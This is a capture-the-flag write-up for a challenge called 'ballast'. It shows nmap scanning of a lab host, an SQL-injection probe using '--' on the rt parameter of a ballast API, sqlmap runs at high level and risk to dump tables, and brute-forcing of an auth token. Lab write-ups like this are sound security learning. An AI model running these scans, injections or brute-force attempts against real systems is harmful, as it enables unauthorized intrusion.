# ballast

## Challenge

```
We need as many options to stop this boat as we can find! If you can figure out a way to sabotage it instead of just taking control of the navigation, that'll work too!

Target: Your target is the authorization code to control the ballast system.

10.0.1.11
```

## Walkthrough

```sh
$ sudo nmap 10.0.1.11 -sS -v -A -p 0-65535
...
Discovered open port 22/tcp on 10.0.1.11
Discovered open port 31968/tcp on 10.0.1.11
Discovered open port 3002/tcp on 10.0.1.11
...
3002/tcp  open  http        nginx
|_http-title: OpenBridge :: Index
...
31968/tcp open  ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
...
```

There were 2 HTTP servers running on the machine. Visiting each server showed that `:3002` was running a different challenge. `:31968` was what I needed to exploit.

Navigating to `:31968` provided a convenient swagger definitions page behind a warning page due to the self signed certificate.

Clearly I needed to exploit the `GET /ballast` in order to find the auth token.

I played around with some different invalid inputs to get a feel for what I thought that exploit might be.


```sh
$ curl -k 'https://10.0.1.11:31968/ballast?rt=123' 
[{"readTime":"2022-01-16T00:56:14Z","statusRaw":972035,"port":97,"stbd":97}]

$ curl -k 'https://10.0.1.11:31968/ballast?rt=abcd'
[]

$ curl -k 'https://10.0.1.11:31968/ballast?rt=--abcd'
[{"readTime":"2022-01-16T00:56:14Z","statusRaw":972035,"port":97,"stbd":97}]   
```

After noticing that an invalid input lead to an empty json array I tried placing the string after an SQL comment `--`. This worked, giving away that the issue was likely SQLI.

To exploit the SQLI I brought out `sqlmap`, an automatic SQLI exploiting tool. I had to run it through an HTTP proxy since `sqlmap` doesn't support an insecure mode where certificates aren't checked.

```sh
$ sqlmap -u 'https://10.0.1.11:31968/ballast?rt=1' --proxy="http://localhost:8080" --level 5 --risk 3 --threads 10 --tables
...

$ sqlmap -u 'https://10.0.1.11:31968/ballast?rt=1' --proxy="http://localhost:8080" --level 5 --risk 3 --threads 10 -T auth
...
Table: auth

```

And this is where I ran out of time :( However I continued to solve the challenge after the timer was up.

I created a python script to try every auth token and find which was correct. [authcheck.py](authcheck.py)

```
$ python3 authcheck.py
...
b6af0a74f1787e3a 202
```

So close!
